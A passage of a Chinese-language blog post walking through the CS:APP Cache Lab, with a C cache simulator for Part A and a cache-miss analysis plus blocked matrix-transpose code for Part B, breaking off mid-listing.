class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">L</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> tag;	<span class="comment">// 标志位</span></span><br><span class="line">    <span class="type">bool</span> vaild;	<span class="comment">// 有效位</span></span><br><span class="line">    <span class="type">int</span> stamp;	<span class="comment">// 时间戳</span></span><br><span class="line">    <span class="comment">// int *block;  不需要块，这里只是模拟</span></span><br><span class="line">&#125; Line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">g</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> s;	<span class="comment">// 组数</span></span><br><span class="line">    <span class="type">int</span> e;	<span class="comment">// 关联性</span></span><br><span class="line">    <span class="type">int</span> b;	<span class="comment">// 块位数</span></span><br><span class="line">    Line **groups;	</span><br><span class="line">&#125; Cache;</span><br><span class="line"></span><br><span class="line">Cache cache;	<span class="comment">// 缓存</span></span><br><span class="line"><span class="type">char</span> tracefile[<span class="number">1000</span>];	<span class="comment">// 跟踪文件</span></span><br><span class="line"><span class="type">int</span> miss_count;	<span class="comment">// 未命中数量</span></span><br><span class="line"><span class="type">int</span> hit_count;	<span class="comment">// 命中数量</span></span><br><span class="line"><span class="type">int</span> eviction_count;	<span class="comment">// 驱逐数量</span></span><br><span class="line"><span class="type">bool</span> verbose;	<span class="comment">// 是否详细显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> s 组数</span></span><br><span class="line"><span class="comment"> e 关联性</span></span><br><span class="line"><span class="comment"> b 块位数</span></span><br><span class="line"><span class="comment"> 初始化缓存（尽量所用 sizeof，增强可移植性）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> e, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">    <span class="type">int</span> B = <span class="number">1</span> &lt;&lt; b;</span><br><span class="line">    cache.s = S;</span><br><span class="line">    cache.e = e;</span><br><span class="line">    cache.b = B;</span><br><span class="line">    cache.groups = (Line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Line*) * S); </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">    	cache.groups[i] = (Line*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Line) * e);</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; e; j++) &#123;</span><br><span class="line">    	    cache.groups[i][j].tag = <span class="number">-1</span>;</span><br><span class="line">    	    cache.groups[i][j].stamp = <span class="number">0</span>;</span><br><span class="line">    	    cache.groups[i][j].vaild = <span class="literal">false</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> index 行索引</span></span><br><span class="line"><span class="comment"> tag 标记值</span></span><br><span class="line"><span class="comment"> 在相关组中，将相关行的时间戳更新为 0 更新 tag 更新 vaild，其余行时间戳增加</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">update_stamp</span><span class="params">(<span class="type">int</span> groupIndex, <span class="type">int</span> index, <span class="type">int</span> tag)</span> &#123;</span><br><span class="line">    cache.groups[groupIndex][index].vaild = <span class="literal">true</span>;</span><br><span class="line">    cache.groups[groupIndex][index].tag = tag;</span><br><span class="line">    <span class="type">int</span> length = cache.e;</span><br><span class="line">    Line *line = cache.groups[groupIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (line[i].vaild) &#123;</span><br><span class="line">    	    ++line[i].stamp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cache.groups[groupIndex][index].stamp = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> tag 标记值</span></span><br><span class="line"><span class="comment"> 如果命中了，返回命中行的索引，否则返回 -1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isHit</span><span class="params">(<span class="type">int</span> groupIndex, <span class="type">int</span> tag)</span> &#123;</span><br><span class="line">    Line *line = cache.groups[groupIndex];</span><br><span class="line">    <span class="type">int</span> length = cache.e;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (line[i].vaild &amp;&amp; line[i].tag == tag) &#123;</span><br><span class="line">    	    <span class="keyword">return</span> i;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> tag 标记值</span></span><br><span class="line"><span class="comment"> 这里有一个条件假设，即我们每次都是在调用完 isHit 后才调用 isNotEvict 的</span></span><br><span class="line"><span class="comment"> 如果不是冲突导致的不命中，返回第一个不冲突的行索引，否则返回 -1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isNotEvict</span><span class="params">(<span class="type">int</span> groupIndex)</span> &#123;</span><br><span class="line">    Line *line = cache.groups[groupIndex];</span><br><span class="line">    <span class="type">int</span> length = cache.e;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (!line[i].vaild) </span><br><span class="line">    	    <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> 在相关组中，得到时间戳最大的行索引</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getLast</span><span class="params">(<span class="type">int</span> groupIndex)</span> &#123;</span><br><span class="line">    <span class="type">int</span> length = cache.e;</span><br><span class="line">    Line *line = cache.groups[groupIndex];</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (line[i].stamp &gt; max) &#123; </span><br><span class="line">            index = i;</span><br><span class="line">            max = line[i].stamp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> tag 标记值</span></span><br><span class="line"><span class="comment"> 更新命中数/不命中数/驱逐数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">int</span> groupIndex, <span class="type">int</span> tag)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((index = isHit(groupIndex, tag)) != <span class="number">-1</span>) &#123;</span><br><span class="line">    	update_stamp(groupIndex, index, tag);</span><br><span class="line">    	++hit_count;</span><br><span class="line">    	<span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;hit&quot;</span>);</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ++miss_count;</span><br><span class="line">    <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;mis&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((index = isNotEvict(groupIndex)) == <span class="number">-1</span>) &#123;</span><br><span class="line">    	</span><br><span class="line">    	index = getLast(groupIndex);</span><br><span class="line">    	++eviction_count;</span><br><span class="line">    	<span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;eviction&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    &#125; </span><br><span class="line">    update_stamp(groupIndex, index, tag);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> s 组数</span></span><br><span class="line"><span class="comment"> b 块位数</span></span><br><span class="line"><span class="comment"> 读取文件，根据地址模拟缓存中的行为</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">trace</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    FILE *file = fopen(tracefile, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;Fail to open the file!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> space;	<span class="comment">// 内存访问类型</span></span><br><span class="line">    <span class="type">unsigned</span> address; 	<span class="comment">// 操作地址</span></span><br><span class="line">    <span class="type">int</span> size;	<span class="comment">// 访问字节数</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%c %x, %d&quot;</span>, &amp;space, &amp;address, &amp;size) != EOF) &#123; <span class="comment">// 细节</span></span><br><span class="line">    	<span class="type">int</span> tag = address &gt;&gt; (s + b);	</span><br><span class="line">    	<span class="type">int</span> groupIndex = (address &gt;&gt; b) &amp; ((<span class="type">unsigned</span>)(<span class="number">-1</span>) &gt;&gt; (<span class="keyword">sizeof</span>(<span class="type">unsigned</span>) * <span class="number">8</span>  - s)); </span><br><span class="line">    	<span class="keyword">switch</span> (space) &#123;</span><br><span class="line">    	<span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">    	    update(groupIndex, tag);	<span class="comment">// 数据加载</span></span><br><span class="line">    	    <span class="keyword">break</span>;</span><br><span class="line">    	<span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">    	    update(groupIndex, tag);	<span class="comment">// 数据存储</span></span><br><span class="line">    	    <span class="keyword">break</span>;</span><br><span class="line">    	<span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">    	    update(groupIndex, tag);	<span class="comment">// 数据修改（加载 + 存储）</span></span><br><span class="line">    	    update(groupIndex, tag);</span><br><span class="line">    	    <span class="keyword">break</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_cache</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> length = cache.s;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(cache.groups[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(cache.groups);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 打印帮助</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_help</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;./csim-ref: Missing required command line argument\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Options:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -h         Print this help message.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Examples:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;	</span><br><span class="line">    <span class="type">int</span> opt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            print_help();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            verbose = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            e = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(tracefile, optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            print_help();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    init(s, e, b);</span><br><span class="line">    trace(s, b);</span><br><span class="line">    free_cache();</span><br><span class="line">    printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <strong>.&#x2F;test-csim</strong>，运行结果如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326183041125.png" class="" title="image-20240326183041125">

<ul>
<li>27 分满分！！！</li>
</ul>
<h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><ul>
<li><p>B 部分要求我们在 trans.c 中编写一个转置矩阵函数，尽可能的减少缓存未命中的情况</p>
</li>
<li><p>我们的转置矩阵函数需要分别工作在不同的情况下，因此需要针对不同的 M 和 N 做对应的优化</p>
<ul>
<li>32 * 32，未命中次数小于 300 满分，大于 600 不通过</li>
<li>64 * 64，未命中次数小于 1300 满分，大于 2000 不通过</li>
<li>61 * 67，未命中次数小于 2000 满分，大于 3000 不通过</li>
</ul>
</li>
<li><p>对于缓存，给出的参数为 <strong>s &#x3D; 5，E &#x3D; 1，b &#x3D; 5</strong>，即缓存有 32 个组，每组 1 行，每块（行） 8 个 int</p>
</li>
<li><p>我们先来分析一下为什么要做优化</p>
</li>
<li><p>trans.c 中包含了一个帮助我们入门的转置矩阵函数，没有做任何优化，我们通过 <strong>.&#x2F;test-trans -M 32 -N 32</strong> 运行它</p>
<blockquote>
<p>每次更新都需要通过 <strong>make</strong> 重新编译，这很重要！</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240325211925698.png" class="" title="image-20240325211925698">

<ul>
<li>我们发现对于 32 * 32 的矩阵，缓存未命中次数很容易的就达到了 1183，我们看一下它的源码</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们来分析一下到底发生了什么造成这么多的缓存未命中</li>
<li>我们的 cache 大小为 32 组，每组一行，每块 8 个 int，而对于 32 * 32 的矩阵来说，矩阵的 8 行就可以填满整个 cache</li>
<li>对于 32 * 32 的矩阵，每 4 组为矩阵的一行，cache 中块的大致分布如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326163543422.png" class="" title="image-20240326163543422">

<ul>
<li><p>读入 A[0] [0] ，A[0] [0] 会造成一次缓存未命中，之后不仅 A[0] [0] 被存入第一个块了，A[0] [1] …… A[0] [7] 都会读入 cache 中第一个块，因为 cache 都是以块为单位操作的</p>
</li>
<li><p>将 A[0] [0] 写入 B[0] [0]，B[0] [0] 由于索引相同，也会映射到第一个块，这样就造成了一次缓存未命中和一次冲突未命中，之后 B[0] [0] 存入第一个块，将第一个块覆盖，当然 B[0] [1] …… B[0] [7] 也存入了</p>
</li>
<li><p>接着，读入 A[0] [1]，还是映射到第一个块，造成了一次缓存未命中和一次冲突未命中， 重新将 A[0] [0] …… A[0] [7] 覆盖到第一个块</p>
</li>
<li><p>将 A[0] [1] 写入 B[1] [0]，B[1] [0] 会映射到第二个块，只会造成一次缓存未命中，所以 B[0] [0] …… B[0] [7] 覆盖到第二个块</p>
</li>
<li><p>之后的情况就很明了了</p>
</li>
<li><p>我们发现对于 A 的每 8 个元素都会造成一次缓存未命中，即 A 的每一行都会有 32 &#x2F; 8 &#x3D; 4 次不命中</p>
</li>
<li><p>由于 B 是按列写入的，当 B 存入 8 行填满 cache 后，接下来还会再继续存入 8 行，会重新映射到第一个块，覆盖已经存入的行，造成一次冲突未命中和一次缓存未命中，所以 B 的每一行都会造成缓存不命中</p>
</li>
<li><p>除此之外，我们还没有考虑对角线的情况，即当 B[i] [i] &#x3D; A[i] [i] 时，先读取 A[i] [i] 可能造成一次缓存未命中，写入 B[i] [i] 时，由于会映射到同一个块，造成一次冲突未命中和一次缓存未命中，接下来读入 A[i] [i + 1] 时还会造成一次冲突未命中和一次缓存未命中</p>
</li>
<li><p>我们已经知道为什么会造成这么多的缓存未命中了，而对于怎么优化，讲义中已经给出了提示：<strong>分块优化</strong></p>
</li>
</ul>
<h2 id="32-32"><a href="#32-32" class="headerlink" title="32 * 32"></a>32 * 32</h2><ul>
<li>根据上述对未优化的转置矩阵函数的行为描述，我发现了一个很严重的问题，当我们存入 B 的行后，我们并没有充分利用缓存，甚至造成了极大的缓存浪费。例如：当存入 B[1] [0] 后，我们并没有利用已将存入当前块的 B[1] [1] …… B[1] [7]，当我们读入 B[9] [0] 时就会重新映射到这个块，B[9] [0] …… B[9] [7] 会覆盖它</li>
<li>这是造成大量缓存未命中的主要原因，我们没有利用缓存中已有的元素</li>
<li>如果我们可以在将 A[0] [0] …… A[0] [7] 存入 B[0] [0] …… B[7] [0] 后，再将 A[1] [0] …… A[1] [7] 存入 B[0] [1] …… B[7] [1]，甚至按照这样的思路，不断的将 A 的一行 8 个元素存放到 B 的一列中，直到将 A[7] [0] …… A[7] [7] 存入 B[0] [7] …… B[7] [7]，这样不就充分利用了 B 已经存入缓存中的元素了吗</li>
<li>上述的思路就是一种分块的思想，我们将 A 的 8 * 8 块存入 B 的 8 * 8 块，充分利用了缓存</li>
<li>具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">    	    <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">8</span>; k++) &#123;</span><br><span class="line">    	    	<span class="keyword">for</span> (<span class="type">int</span> s = j; s &lt; j + <span class="number">8</span>; s++) &#123;</span><br><span class="line">    	    	    B[s][k] = A[k][s];</span><br><span class="line">    	    	&#125;</span><br><span class="line">    	    &#125;</span><br><span class="line">    	&#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <strong>.&#x2F;test-trans -M 32 -N 32</strong> 运行程序，运行结果如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240325225426182.png" class="" title="image-20240325225426182">

<ul>
<li><p>没有得到满分，这是因为由于对角线的情况，当 B[i] [i] &#x3D; A[i] [i] 时，B 覆盖 A，A 又会覆盖 B，会造成额外的冲突不命中和缓存不命中</p>
</li>
<li><p>这时就可以利用到讲义中提到的一个条件（也是提示）：不能使用超过 12 个局部变量。我们可能有些疑惑，这些局部变量有什么用，为什么还要限制使用呢</p>
</li>
<li><p>我们可以利用局部变量，一次性的将 A 中一行 8 个元素存到局部变量中，再将它们写入到 B 的一列，这样就不会遇到：当一次一次赋值时，B[i] [i] &#x3D; A[i] [i] 造成额外的冲突不命中和缓存不命中了。仅仅是 A 的每一行 8 个元素会造成一次缓存不命中（已经是 A 的最优情况了）</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> x1, x2, x3, x4, x5, x6, x7, x8;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">    	    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++) &#123;</span><br><span class="line">	    	    x1 = A[k + i][j];</span><br><span class="line">	    	    x2 = A[k + i][j + <span class="number">1</span>];</span><br><span class="line">	    	    x3 = A[k + i][j + <span class="number">2</span>];</span><br><span class="line">	    	    x4 = A[k + i][j + <span class="number">3</span>];</span><br><span class="line">	    	    x5 = A[k + i][j + <span class="number">4</span>];</span><br><span class="line">	    	    x6 = A[k + i][j + <span class="number">5</span>];</span><br><span class="line">	    	    x7 = A[k + i][j + <span class="number">6</span>];</span><br><span class="line">	    	    x8 = A[k + i][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">	    	    B[j][k + i] = x1;</span><br><span class="line">	    	    B[j + <span class="number">1</span>][k + i] = x2;</span><br><span class="line">	    	    B[j + <span class="number">2</span>][k + i] = x3;</span><br><span class="line">	    	    B[j + <span class="number">3</span>][k + 